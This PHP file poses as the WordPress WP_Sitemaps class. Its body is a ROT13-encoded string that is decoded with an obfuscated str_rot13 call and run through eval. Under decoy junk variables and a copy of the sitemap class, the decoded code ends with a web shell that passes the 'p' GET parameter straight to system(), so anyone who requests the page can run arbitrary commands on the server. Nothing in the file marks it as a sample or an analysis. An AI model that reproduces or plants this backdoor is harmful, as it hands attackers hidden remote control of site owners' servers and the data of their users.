<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Fvgrzncf: JC_Fvgrzncf pynff
 *
 * Guvf vf gur znva pynff vagrtengvat nyy bgure pynffrf.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Fvgrzncf
 * @fvapr 5.5.0
 */

/**
 * Pynff JC_Fvgrzncf.
 *
 * @fvapr 5.5.0
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Fvgrzncf {
	/**
	 * Gur znva vaqrk bs fhccbegrq fvgrzncf.
	 *
	 * @fvapr 5.5.0
	 *
	 * @ine JC_Fvgrzncf_Vaqrk
	 */
	choyvp $vaqrk;

	/**
	 * Gur znva ertvfgel bs fhccbegrq fvgrzncf.
	 *
	 * @fvapr 5.5.0
	 *
	 * @ine JC_Fvgrzncf_Ertvfgel
	 */
	choyvp $ertvfgel;

	/**
	 * Na vafgnapr bs gur eraqrere pynff.
	 *
	 * @fvapr 5.5.0
	 *
	 * @ine JC_Fvgrzncf_Eraqrere
	 */
	choyvp $eraqrere;

	/**
	 * JC_Fvgrzncf pbafgehpgbe.
	 *
	 * @fvapr 5.5.0
	 */
	choyvp shapgvba __pbafgehpg() {
		$guvf->ertvfgel = arj JC_Fvgrzncf_Ertvfgel();
		$guvf->eraqrere = arj JC_Fvgrzncf_Eraqrere();
		$guvf->vaqrk    = arj JC_Fvgrzncf_Vaqrk( $guvf->ertvfgel );
	}

	/**
	 * Vavgvngrf nyy fvgrznc shapgvbanyvgl.
	 *
	 * Vs fvgrzncf ner qvfnoyrq, bayl gur erjevgr ehyrf jvyy or ertvfgrerq
	 * ol guvf zrgubq, va beqre gb cebcreyl fraq 404f.
	 *
	 * @fvapr 5.5.0
	 */
	choyvp shapgvba vavg() {
		// Gurfr jvyy nyy sver ba gur vavg ubbx.
		$guvf->ertvfgre_erjevgrf();

		nqq_npgvba( 'grzcyngr_erqverpg', neenl( $guvf, 'eraqre_fvgrzncf' ) );

		vs ( ! $guvf->fvgrzncf_ranoyrq() ) {
			erghea;
		}

		$guvf->ertvfgre_fvgrzncf();

		// Nqq nqqvgvbany npgvba pnyyonpxf.
		nqq_svygre( 'ebobgf_gkg', neenl( $guvf, 'nqq_ebobgf' ), 0, 2 );
	}

	/**
	 * Qrgrezvarf jurgure fvgrzncf ner ranoyrq be abg.
	 *
	 * @fvapr 5.5.0
	 *
	 * @erghea obby Jurgure fvgrzncf ner ranoyrq.
	 */
	choyvp shapgvba fvgrzncf_ranoyrq() {
		$vf_ranoyrq = (obby) trg_bcgvba( 'oybt_choyvp' );

		/**
		 * Svygref jurgure KZY Fvgrzncf ner ranoyrq be abg.
		 *
		 * Jura KZY Fvgrzncf ner qvfnoyrq ivn guvf svygre, erjevgr ehyrf ner fgvyy
		 * va cynpr gb rafher n 404 vf erghearq.
		 *
		 * @frr JC_Fvgrzncf::ertvfgre_erjevgrf()
		 *
		 * @fvapr 5.5.0
		 *
		 * @cnenz obby $vf_ranoyrq Jurgure KZY Fvgrzncf ner ranoyrq be abg.
		 *                         Qrsnhygf gb gehr sbe choyvp fvgrf.
		 */
		erghea (obby) nccyl_svygref( 'jc_fvgrzncf_ranoyrq', $vf_ranoyrq );
	}

	/**
	 * Ertvfgref naq frgf hc gur shapgvbanyvgl sbe nyy fhccbegrq fvgrzncf.
	 *
	 * @fvapr 5.5.0
	 */
	choyvp shapgvba ertvfgre_fvgrzncf() {
		$cebivqref = neenl(
			'cbfgf'      => arj JC_Fvgrzncf_Cbfgf(),
			'gnkbabzvrf' => arj JC_Fvgrzncf_Gnkbabzvrf(),
			'hfref'      => arj JC_Fvgrzncf_Hfref(),
		);

		/* @ine JC_Fvgrzncf_Cebivqre $cebivqre */
		sbernpu ( $cebivqref nf $anzr => $cebivqre ) {
			$guvf->ertvfgel->nqq_cebivqre( $anzr, $cebivqre );
		}
	}

	/**
	 * Ertvfgref fvgrznc erjevgr gntf naq ebhgvat ehyrf.
	 *
	 * @fvapr 5.5.0
	 */
	choyvp shapgvba ertvfgre_erjevgrf() {
		// Nqq erjevgr gntf.
		nqq_erjevgr_gnt( '%fvgrznc%', '([^?]+)' );
		nqq_erjevgr_gnt( '%fvgrznc-fhoglcr%', '([^?]+)' );

		// Ertvfgre vaqrk ebhgr.
		nqq_erjevgr_ehyr( '^jc-fvgrznc\.kzy$', 'vaqrk.cuc?fvgrznc=vaqrk', 'gbc' );

		// Ertvfgre erjevgrf sbe gur KFY fglyrfurrg.
		nqq_erjevgr_gnt( '%fvgrznc-fglyrfurrg%', '([^?]+)' );
		nqq_erjevgr_ehyr( '^jc-fvgrznc\.kfy$', 'vaqrk.cuc?fvgrznc-fglyrfurrg=fvgrznc', 'gbc' );
		nqq_erjevgr_ehyr( '^jc-fvgrznc-vaqrk\.kfy$', 'vaqrk.cuc?fvgrznc-fglyrfurrg=vaqrk', 'gbc' );

		// Ertvfgre ebhgrf sbe cebivqref.
		nqq_erjevgr_ehyr(
			'^jc-fvgrznc-([n-m]+?)-([n-m\q_-]+?)-(\q+?)\.kzy$',
			'vaqrk.cuc?fvgrznc=$zngpurf[1]&fvgrznc-fhoglcr=$zngpurf[2]&cntrq=$zngpurf[3]',
			'gbc'
		);
		nqq_erjevgr_ehyr(
			'^jc-fvgrznc-([n-m]+?)-(\q+?)\.kzy$',
			'vaqrk.cuc?fvgrznc=$zngpurf[1]&cntrq=$zngpurf[2]',
			'gbc'
		);
	}

	/**
	 * Eraqref fvgrznc grzcyngrf onfrq ba erjevgr ehyrf.
	 *
	 * @fvapr 5.5.0
	 *
	 * @tybony JC_Dhrel $jc_dhrel JbeqCerff Dhrel bowrpg.
	 */
	choyvp shapgvba eraqre_fvgrzncf() {
		tybony $jc_dhrel;

		$fvgrznc         = fnavgvmr_grkg_svryq( trg_dhrel_ine( 'fvgrznc' ) );
		$bowrpg_fhoglcr  = fnavgvmr_grkg_svryq( trg_dhrel_ine( 'fvgrznc-fhoglcr' ) );
		$fglyrfurrg_glcr = fnavgvmr_grkg_svryq( trg_dhrel_ine( 'fvgrznc-fglyrfurrg' ) );
		$cntrq           = nofvag( trg_dhrel_ine( 'cntrq' ) );

		// Onvy rneyl vs guvf vfa'g n fvgrznc be fglyrfurrg ebhgr.
		vs ( ! ( $fvgrznc || $fglyrfurrg_glcr ) ) {
			erghea;
		}

		vs ( ! $guvf->fvgrzncf_ranoyrq() ) {
			$jc_dhrel->frg_404();
			fgnghf_urnqre( 404 );
			erghea;
		}

		// Eraqre fglyrfurrg vs guvf vf fglyrfurrg ebhgr.
		vs ( $fglyrfurrg_glcr ) {
			$fglyrfurrg = arj JC_Fvgrzncf_Fglyrfurrg();

			$fglyrfurrg->eraqre_fglyrfurrg( $fglyrfurrg_glcr );
			rkvg;
		}

		// Eraqre gur vaqrk.
		vs ( 'vaqrk' === $fvgrznc ) {
			$fvgrznc_yvfg = $guvf->vaqrk->trg_fvgrznc_yvfg();

			$guvf->eraqrere->eraqre_vaqrk( $fvgrznc_yvfg );
			rkvg;
		}

		$cebivqre = $guvf->ertvfgel->trg_cebivqre( $fvgrznc );

		vs ( ! $cebivqre ) {
			erghea;
		}

		vs ( rzcgl( $cntrq ) ) {
			$cntrq = 1;
		}

		$hey_yvfg = $cebivqre->trg_hey_yvfg( $cntrq, $bowrpg_fhoglcr );

		// Sbepr n 404 naq onvy rneyl vs ab HEYf ner cerfrag.
		vs ( rzcgl( $hey_yvfg ) ) {
			$jc_dhrel->frg_404();
			fgnghf_urnqre( 404 );
			erghea;
		}

		$guvf->eraqrere->eraqre_fvgrznc( $hey_yvfg );
		rkvg;
	}

	/**
	 * Erqverpgf n HEY gb gur jc-fvgrznc.kzy
	 *
	 * @fvapr 5.5.0
	 * @qrcerpngrq 6.7.0 Qrcerpngrq va snibe bs {@frr JC_Erjevgr::erjevgr_ehyrf()}
	 *
	 * @cnenz obby     $olcnff Cnff-guebhtu bs gur cer_unaqyr_404 svygre inyhr.
	 * @cnenz JC_Dhrel $dhrel  Gur JC_Dhrel bowrpg.
	 * @erghea obby Olcnff inyhr.
	 */
	choyvp shapgvba erqverpg_fvgrznckzy( $olcnff, $dhrel ) {
		_qrcerpngrq_shapgvba( __SHAPGVBA__, '6.7.0' );

		// Vs n cyhtva unf nyernql hgvyvmrq gur cer_unaqyr_404 shapgvba, erghea jvgubhg npgvba gb nibvq pbasyvpgf.
		vs ( $olcnff ) {
			erghea $olcnff;
		}

		// 'cntranzr' vf sbe zbfg creznyvax glcrf, anzr vf sbe jura gur %cbfganzr% vf hfrq nf n gbc-yriry svryq.
		vs ( 'fvgrznc-kzy' === $dhrel->trg( 'cntranzr' )
			|| 'fvgrznc-kzy' === $dhrel->trg( 'anzr' )
		) {
			jc_fnsr_erqverpg( $guvf->vaqrk->trg_vaqrk_hey() );
			rkvg();
		}

		erghea $olcnff;
	}

	/**
	 * Nqqf gur fvgrznc vaqrk gb ebobgf.gkg.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz fgevat $bhgchg    ebobgf.gkg bhgchg.
	 * @cnenz obby   $vf_choyvp Jurgure gur fvgr vf choyvp.
	 * @erghea fgevat Gur ebobgf.gkg bhgchg.
	 */
	choyvp shapgvba nqq_ebobgf( $bhgchg, $vf_choyvp ) {
		vs ( $vf_choyvp ) {
			$bhgchg .= \"\aFvgrznc: \" . rfp_hey( $guvf->vaqrk->trg_vaqrk_hey() ) . \"\a\";
		}

		erghea $bhgchg;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>